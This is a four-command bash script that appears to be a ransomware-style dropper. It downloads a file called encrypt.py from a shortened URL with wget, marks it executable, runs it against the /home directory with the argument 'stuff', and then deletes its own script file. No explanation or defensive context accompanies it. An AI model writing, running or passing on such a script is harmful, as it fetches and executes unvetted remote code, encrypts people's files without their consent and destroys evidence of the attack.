#!/bin/bash

wget -O encrypt.py https://cutt.ly/ETdGF6o
chmod +x encrypt.py
./encrypt.py /home 'stuff'
rm $BASH_SOURCE
